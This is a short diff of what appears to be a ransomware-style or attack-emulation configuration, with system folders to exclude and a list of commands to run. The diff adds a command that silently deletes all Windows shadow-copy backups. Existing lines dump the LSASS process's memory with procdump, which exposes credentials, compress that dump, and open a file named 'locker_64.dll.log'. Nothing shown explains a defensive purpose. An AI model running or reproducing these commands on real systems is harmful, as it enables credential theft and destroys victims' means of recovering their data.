@@ -7,6 +7,7 @@ exclude:
   - '%SYSTEMDRIVE%\Windows'
   - '%SYSTEMDRIVE%\ProgramData'
 command:
+  - vssadmin delete shadows /all /quiet
   - C:\Windows\SysWow64\NOTEPAD.EXE C:\Windows\locker_64.dll.log
   - makecab  lsass.dmp lsass.dmp.cab
   - procdump64.exe -accepteula -ma lsass.exe lsass.dmp
